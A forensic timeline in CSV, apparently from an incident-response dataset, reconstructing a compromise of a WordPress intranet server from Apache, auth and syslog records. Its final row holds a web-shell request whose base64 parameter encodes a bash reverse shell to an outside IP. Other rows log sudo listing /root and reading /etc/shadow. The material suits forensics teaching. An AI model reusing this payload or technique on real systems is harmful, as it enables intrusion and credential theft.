date,time,timezone,MACB,source,sourcetype,type,user,host,short,desc,version,filename,inode,notes,format,extra
01/18/2022,13:13:29,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-includes/css/dist/block-library/style.min.css?ver=5.8.3 HTTP/1.1 from...,http_request: GET /wp-includes/css/dist/block-library/style.min.css?ver=5.8.3 HTTP/1.1 from: 172.17.130.196 code: 200 referer: http://intranet.price.fox.org/ user_agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 10846; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:13:29,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2 HTTP/1.1 from: 172...,http_request: GET /wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2 HTTP/1.1 from: 172.17.130.196 code: 200 referer: http://intranet.price.fox.org/ user_agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 4505; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:13:29,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-includes/js/jquery/jquery.min.js?ver=3.6.0 HTTP/1.1 from: 172.17.130.196,http_request: GET /wp-includes/js/jquery/jquery.min.js?ver=3.6.0 HTTP/1.1 from: 172.17.130.196 code: 200 referer: http://intranet.price.fox.org/ user_agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 31246; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:13:29,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-includes/js/wp-embed.min.js?ver=5.8.3 HTTP/1.1 from: 172.17.130.196,http_request: GET /wp-includes/js/wp-embed.min.js?ver=5.8.3 HTTP/1.1 from: 172.17.130.196 code: 200 referer: http://intranet.price.fox.org/ user_agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 1099; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:13:29,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-includes/js/wp-emoji-release.min.js?ver=5.8.3 HTTP/1.1 from: 172.17.1...,http_request: GET /wp-includes/js/wp-emoji-release.min.js?ver=5.8.3 HTTP/1.1 from: 172.17.130.196 code: 200 referer: http://intranet.price.fox.org/ user_agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 5266; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:13:31,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /favicon.ico HTTP/1.1 from: 172.17.130.196,http_request: GET /favicon.ico HTTP/1.1 from: 172.17.130.196 code: 404 referer: http://intranet.price.fox.org/ user_agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 396; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:13:36,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,OPTIONS * HTTP/1.0 from: ::1,http_request: OPTIONS * HTTP/1.0 from: ::1 code: 200 user_agent: Apache/2.4.29 (Ubuntu) OpenSSL/1.1.1 (internal dummy connection),2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 110; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:14:31,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[su  pid: 28816] Successful su for phopkins by www-data,[su  pid: 28816] Successful su for phopkins by www-data,2,OS:D:\dataset\evidences\auth.log,-,-,text/syslog_traditional,sha256_hash: a487d742977818adc4796645f4c842477780cc42ab44b6faf440102ad5e205d2
01/18/2022,13:14:31,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[su  pid: 28816] + /dev/pts/1 www-data:phopkins,[su  pid: 28816] + /dev/pts/1 www-data:phopkins,2,OS:D:\dataset\evidences\auth.log,-,-,text/syslog_traditional,sha256_hash: a487d742977818adc4796645f4c842477780cc42ab44b6faf440102ad5e205d2
01/18/2022,13:14:31,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[systemd] pam_unix(systemd-user:session): session opened for user phopkins by...,[systemd] pam_unix(systemd-user:session): session opened for user phopkins by (uid=0),2,OS:D:\dataset\evidences\auth.log,-,-,text/syslog_traditional,sha256_hash: a487d742977818adc4796645f4c842477780cc42ab44b6faf440102ad5e205d2
01/18/2022,13:14:31,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[systemd  pid: 1] Created slice User Slice of phopkins.,[systemd  pid: 1] Created slice User Slice of phopkins.,2,OS:D:\dataset\evidences\syslog,-,-,text/syslog_traditional,sha256_hash: 9ace5ff984bb2a2a8b0491d3a2a5aa7f7f134843d7693cdb4706c28dfedf5fe9
01/18/2022,13:14:31,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[systemd-logind  pid: 1011] New session c1 of user phopkins.,[systemd-logind  pid: 1011] New session c1 of user phopkins.,2,OS:D:\dataset\evidences\auth.log,-,-,text/syslog_traditional,sha256_hash: a487d742977818adc4796645f4c842477780cc42ab44b6faf440102ad5e205d2
01/18/2022,13:14:31,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[systemd  pid: 1] Started Session c1 of user phopkins.,[systemd  pid: 1] Started Session c1 of user phopkins.,2,OS:D:\dataset\evidences\syslog,-,-,text/syslog_traditional,sha256_hash: 9ace5ff984bb2a2a8b0491d3a2a5aa7f7f134843d7693cdb4706c28dfedf5fe9
01/18/2022,13:14:31,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[systemd  pid: 1] Starting User Manager for UID 1001...,[systemd  pid: 1] Starting User Manager for UID 1001...,2,OS:D:\dataset\evidences\syslog,-,-,text/syslog_traditional,sha256_hash: 9ace5ff984bb2a2a8b0491d3a2a5aa7f7f134843d7693cdb4706c28dfedf5fe9
01/18/2022,13:14:31,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[su  pid: 28816] pam_unix(su:session): session opened for user phopkins by (u...,[su  pid: 28816] pam_unix(su:session): session opened for user phopkins by (uid=33),2,OS:D:\dataset\evidences\auth.log,-,-,text/syslog_traditional,sha256_hash: a487d742977818adc4796645f4c842477780cc42ab44b6faf440102ad5e205d2
01/18/2022,13:14:32,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[systemd  pid: 28817] Listening on GnuPG cryptographic agent (ssh-agent emula...,[systemd  pid: 28817] Listening on GnuPG cryptographic agent (ssh-agent emulation).,2,OS:D:\dataset\evidences\syslog,-,-,text/syslog_traditional,sha256_hash: 9ace5ff984bb2a2a8b0491d3a2a5aa7f7f134843d7693cdb4706c28dfedf5fe9
01/18/2022,13:14:32,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[systemd  pid: 28817] Reached target Sockets.,[systemd  pid: 28817] Reached target Sockets.,2,OS:D:\dataset\evidences\syslog,-,-,text/syslog_traditional,sha256_hash: 9ace5ff984bb2a2a8b0491d3a2a5aa7f7f134843d7693cdb4706c28dfedf5fe9
01/18/2022,13:14:32,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[systemd  pid: 28817] Listening on GnuPG cryptographic agent and passphrase c...,[systemd  pid: 28817] Listening on GnuPG cryptographic agent and passphrase cache (restricted).,2,OS:D:\dataset\evidences\syslog,-,-,text/syslog_traditional,sha256_hash: 9ace5ff984bb2a2a8b0491d3a2a5aa7f7f134843d7693cdb4706c28dfedf5fe9
01/18/2022,13:14:32,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[systemd  pid: 1] Started User Manager for UID 1001.,[systemd  pid: 1] Started User Manager for UID 1001.,2,OS:D:\dataset\evidences\syslog,-,-,text/syslog_traditional,sha256_hash: 9ace5ff984bb2a2a8b0491d3a2a5aa7f7f134843d7693cdb4706c28dfedf5fe9
01/18/2022,13:14:32,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[systemd  pid: 28817] Reached target Timers.,[systemd  pid: 28817] Reached target Timers.,2,OS:D:\dataset\evidences\syslog,-,-,text/syslog_traditional,sha256_hash: 9ace5ff984bb2a2a8b0491d3a2a5aa7f7f134843d7693cdb4706c28dfedf5fe9
01/18/2022,13:14:32,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[systemd  pid: 28817] Reached target Basic System.,[systemd  pid: 28817] Reached target Basic System.,2,OS:D:\dataset\evidences\syslog,-,-,text/syslog_traditional,sha256_hash: 9ace5ff984bb2a2a8b0491d3a2a5aa7f7f134843d7693cdb4706c28dfedf5fe9
01/18/2022,13:14:32,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[systemd  pid: 28817] Listening on REST API socket for snapd user session agent.,[systemd  pid: 28817] Listening on REST API socket for snapd user session agent.,2,OS:D:\dataset\evidences\syslog,-,-,text/syslog_traditional,sha256_hash: 9ace5ff984bb2a2a8b0491d3a2a5aa7f7f134843d7693cdb4706c28dfedf5fe9
01/18/2022,13:14:32,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[systemd  pid: 28817] Startup finished in 415ms.,[systemd  pid: 28817] Startup finished in 415ms.,2,OS:D:\dataset\evidences\syslog,-,-,text/syslog_traditional,sha256_hash: 9ace5ff984bb2a2a8b0491d3a2a5aa7f7f134843d7693cdb4706c28dfedf5fe9
01/18/2022,13:14:32,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[systemd  pid: 28817] Reached target Paths.,[systemd  pid: 28817] Reached target Paths.,2,OS:D:\dataset\evidences\syslog,-,-,text/syslog_traditional,sha256_hash: 9ace5ff984bb2a2a8b0491d3a2a5aa7f7f134843d7693cdb4706c28dfedf5fe9
01/18/2022,13:14:32,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[systemd  pid: 28817] Listening on GnuPG network certificate management daemon.,[systemd  pid: 28817] Listening on GnuPG network certificate management daemon.,2,OS:D:\dataset\evidences\syslog,-,-,text/syslog_traditional,sha256_hash: 9ace5ff984bb2a2a8b0491d3a2a5aa7f7f134843d7693cdb4706c28dfedf5fe9
01/18/2022,13:14:32,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[systemd  pid: 28817] Listening on GnuPG cryptographic agent and passphrase c...,[systemd  pid: 28817] Listening on GnuPG cryptographic agent and passphrase cache (access for web browsers).,2,OS:D:\dataset\evidences\syslog,-,-,text/syslog_traditional,sha256_hash: 9ace5ff984bb2a2a8b0491d3a2a5aa7f7f134843d7693cdb4706c28dfedf5fe9
01/18/2022,13:14:32,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[systemd  pid: 28817] Listening on GnuPG cryptographic agent and passphrase c...,[systemd  pid: 28817] Listening on GnuPG cryptographic agent and passphrase cache.,2,OS:D:\dataset\evidences\syslog,-,-,text/syslog_traditional,sha256_hash: 9ace5ff984bb2a2a8b0491d3a2a5aa7f7f134843d7693cdb4706c28dfedf5fe9
01/18/2022,13:14:32,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[systemd  pid: 28817] Reached target Default.,[systemd  pid: 28817] Reached target Default.,2,OS:D:\dataset\evidences\syslog,-,-,text/syslog_traditional,sha256_hash: 9ace5ff984bb2a2a8b0491d3a2a5aa7f7f134843d7693cdb4706c28dfedf5fe9
01/18/2022,13:14:41,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[sudo] phopkins : TTY=pts/1 ; PWD=/var/www/intranet.price.fox.org/wp-content/...,[sudo] phopkins : TTY=pts/1 ; PWD=/var/www/intranet.price.fox.org/wp-content/uploads/2022/01 ; USER=root ; COMMAND=list,2,OS:D:\dataset\evidences\auth.log,-,-,text/syslog_traditional,sha256_hash: a487d742977818adc4796645f4c842477780cc42ab44b6faf440102ad5e205d2
01/18/2022,13:14:43,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[sudo] pam_unix(sudo:session): session opened for user root by (uid=0),[sudo] pam_unix(sudo:session): session opened for user root by (uid=0),2,OS:D:\dataset\evidences\auth.log,-,-,text/syslog_traditional,sha256_hash: a487d742977818adc4796645f4c842477780cc42ab44b6faf440102ad5e205d2
01/18/2022,13:14:43,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[sudo] pam_unix(sudo:session): session closed for user root,[sudo] pam_unix(sudo:session): session closed for user root,2,OS:D:\dataset\evidences\auth.log,-,-,text/syslog_traditional,sha256_hash: a487d742977818adc4796645f4c842477780cc42ab44b6faf440102ad5e205d2
01/18/2022,13:14:43,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[sudo] phopkins : TTY=pts/1 ; PWD=/var/www/intranet.price.fox.org/wp-content/...,[sudo] phopkins : TTY=pts/1 ; PWD=/var/www/intranet.price.fox.org/wp-content/uploads/2022/01 ; USER=root ; COMMAND=/bin/ls -laR /root/,2,OS:D:\dataset\evidences\auth.log,-,-,text/syslog_traditional,sha256_hash: a487d742977818adc4796645f4c842477780cc42ab44b6faf440102ad5e205d2
01/18/2022,13:14:49,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[sudo] pam_unix(sudo:session): session opened for user root by (uid=0),[sudo] pam_unix(sudo:session): session opened for user root by (uid=0),2,OS:D:\dataset\evidences\auth.log,-,-,text/syslog_traditional,sha256_hash: a487d742977818adc4796645f4c842477780cc42ab44b6faf440102ad5e205d2
01/18/2022,13:14:49,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[sudo] pam_unix(sudo:session): session closed for user root,[sudo] pam_unix(sudo:session): session closed for user root,2,OS:D:\dataset\evidences\auth.log,-,-,text/syslog_traditional,sha256_hash: a487d742977818adc4796645f4c842477780cc42ab44b6faf440102ad5e205d2
01/18/2022,13:14:49,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[sudo] phopkins : TTY=pts/1 ; PWD=/var/www/intranet.price.fox.org/wp-content/...,[sudo] phopkins : TTY=pts/1 ; PWD=/var/www/intranet.price.fox.org/wp-content/uploads/2022/01 ; USER=root ; COMMAND=/bin/cat /etc/shadow,2,OS:D:\dataset\evidences\auth.log,-,-,text/syslog_traditional,sha256_hash: a487d742977818adc4796645f4c842477780cc42ab44b6faf440102ad5e205d2
02/19/2022,07:23:40,UTC,M...,FILE,File stat,Content Modification Time,-,-,D:\dataset\evidences\apache2\error.log,OS:D:\dataset\evidences\apache2\error.log Type: file Owner identifier: 0 Group identifier: 0 Mode: 0o666 Number of links: 1,2,OS:D:\dataset\evidences\apache2\error.log,844424930283131,-,filestat,file_size: 284534; file_system_type: OS; is_allocated: True; sha256_hash: be1c1bb0089572f3e1a67efc34b7268b190bbafd74bc6e713a7f75f2e8a44aad
11/01/2025,23:08:48,UTC,...B,FILE,File stat,Creation Time,-,-,D:\dataset\evidences,OS:D:\dataset\evidences Type: directory Owner identifier: 0 Group identifier: 0 Mode: 0o777 Number of links: 1,2,OS:D:\dataset\evidences,844424930283120,-,filestat,file_size: 4096; file_system_type: OS; is_allocated: True
11/01/2025,23:08:48,UTC,...B,FILE,File stat,Creation Time,-,-,D:\dataset\evidences\auth.log,OS:D:\dataset\evidences\auth.log Type: file Owner identifier: 0 Group identifier: 0 Mode: 0o666 Number of links: 1,2,OS:D:\dataset\evidences\auth.log,844424930283121,-,filestat,file_size: 2075; file_system_type: OS; is_allocated: True; sha256_hash: a487d742977818adc4796645f4c842477780cc42ab44b6faf440102ad5e205d2
11/01/2025,23:08:48,UTC,...B,FILE,File stat,Creation Time,-,-,D:\dataset\evidences\syslog,OS:D:\dataset\evidences\syslog Type: file Owner identifier: 0 Group identifier: 0 Mode: 0o666 Number of links: 1,2,OS:D:\dataset\evidences\syslog,844424930283124,-,filestat,file_size: 2511; file_system_type: OS; is_allocated: True; sha256_hash: 9ace5ff984bb2a2a8b0491d3a2a5aa7f7f134843d7693cdb4706c28dfedf5fe9
11/01/2025,23:08:48,UTC,...B,FILE,File stat,Creation Time,-,-,D:\dataset\evidences\apache2,OS:D:\dataset\evidences\apache2 Type: directory Owner identifier: 0 Group identifier: 0 Mode: 0o777 Number of links: 1,2,OS:D:\dataset\evidences\apache2,844424930283128,-,filestat,file_size: 4096; file_system_type: OS; is_allocated: True
11/01/2025,23:08:48,UTC,...B,FILE,File stat,Creation Time,-,-,D:\dataset\evidences\apache2\error.log,OS:D:\dataset\evidences\apache2\error.log Type: file Owner identifier: 0 Group identifier: 0 Mode: 0o666 Number of links: 1,2,OS:D:\dataset\evidences\apache2\error.log,844424930283131,-,filestat,file_size: 284534; file_system_type: OS; is_allocated: True; sha256_hash: be1c1bb0089572f3e1a67efc34b7268b190bbafd74bc6e713a7f75f2e8a44aad
11/01/2025,23:08:48,UTC,...B,FILE,File stat,Creation Time,-,-,D:\dataset\evidences\apache2\access.log,OS:D:\dataset\evidences\apache2\access.log Type: file Owner identifier: 0 Group identifier: 0 Mode: 0o666 Number of links: 1,2,OS:D:\dataset\evidences\apache2\access.log,844424930283136,-,filestat,file_size: 31109; file_system_type: OS; is_allocated: True; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
11/01/2025,23:14:12,UTC,M...,FILE,File stat,Content Modification Time,-,-,D:\dataset\evidences\apache2,OS:D:\dataset\evidences\apache2 Type: directory Owner identifier: 0 Group identifier: 0 Mode: 0o777 Number of links: 1,2,OS:D:\dataset\evidences\apache2,844424930283128,-,filestat,file_size: 4096; file_system_type: OS; is_allocated: True
11/01/2025,23:17:05,UTC,M...,FILE,File stat,Content Modification Time,-,-,D:\dataset\evidences,OS:D:\dataset\evidences Type: directory Owner identifier: 0 Group identifier: 0 Mode: 0o777 Number of links: 1,2,OS:D:\dataset\evidences,844424930283120,-,filestat,file_size: 4096; file_system_type: OS; is_allocated: True
11/01/2025,23:19:01,UTC,MA..,FILE,File stat,Content Modification Time; Last Access Time,-,-,D:\dataset\evidences\apache2\access.log,OS:D:\dataset\evidences\apache2\access.log Type: file Owner identifier: 0 Group identifier: 0 Mode: 0o666 Number of links: 1,2,OS:D:\dataset\evidences\apache2\access.log,844424930283136,-,filestat,file_size: 31109; file_system_type: OS; is_allocated: True; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
11/01/2025,23:19:02,UTC,.A..,FILE,File stat,Last Access Time,-,-,D:\dataset\evidences\apache2,OS:D:\dataset\evidences\apache2 Type: directory Owner identifier: 0 Group identifier: 0 Mode: 0o777 Number of links: 1,2,OS:D:\dataset\evidences\apache2,844424930283128,-,filestat,file_size: 4096; file_system_type: OS; is_allocated: True
11/01/2025,23:19:42,UTC,.A..,FILE,File stat,Last Access Time,-,-,D:\dataset\evidences\apache2\error.log,OS:D:\dataset\evidences\apache2\error.log Type: file Owner identifier: 0 Group identifier: 0 Mode: 0o666 Number of links: 1,2,OS:D:\dataset\evidences\apache2\error.log,844424930283131,-,filestat,file_size: 284534; file_system_type: OS; is_allocated: True; sha256_hash: be1c1bb0089572f3e1a67efc34b7268b190bbafd74bc6e713a7f75f2e8a44aad
11/01/2025,23:20:35,UTC,MA..,FILE,File stat,Content Modification Time; Last Access Time,-,-,D:\dataset\evidences\auth.log,OS:D:\dataset\evidences\auth.log Type: file Owner identifier: 0 Group identifier: 0 Mode: 0o666 Number of links: 1,2,OS:D:\dataset\evidences\auth.log,844424930283121,-,filestat,file_size: 2075; file_system_type: OS; is_allocated: True; sha256_hash: a487d742977818adc4796645f4c842477780cc42ab44b6faf440102ad5e205d2
11/01/2025,23:20:59,UTC,MA..,FILE,File stat,Content Modification Time; Last Access Time,-,-,D:\dataset\evidences\syslog,OS:D:\dataset\evidences\syslog Type: file Owner identifier: 0 Group identifier: 0 Mode: 0o666 Number of links: 1,2,OS:D:\dataset\evidences\syslog,844424930283124,-,filestat,file_size: 2511; file_system_type: OS; is_allocated: True; sha256_hash: 9ace5ff984bb2a2a8b0491d3a2a5aa7f7f134843d7693cdb4706c28dfedf5fe9
11/01/2025,23:23:27,UTC,.A..,FILE,File stat,Last Access Time,-,-,D:\dataset\evidences,OS:D:\dataset\evidences Type: directory Owner identifier: 0 Group identifier: 0 Mode: 0o777 Number of links: 1,2,OS:D:\dataset\evidences,844424930283120,-,filestat,file_size: 4096; file_system_type: OS; is_allocated: True
01/18/2022,13:13:52,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,OPTIONS * HTTP/1.0 from: ::1,http_request: OPTIONS * HTTP/1.0 from: ::1 code: 200 user_agent: Apache/2.4.29 (Ubuntu) OpenSSL/1.1.1 (internal dummy connection),2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 110; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:14:18,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJiYX...,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJiYXNoIiwgIi1jIiwgIiAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xOTIuMTY4LjEzMC43Ny81MTg5ODsgc2ggPCYxOTYgPiYxOTYgMj4mMTk2JyIsICImIl0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 506717; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
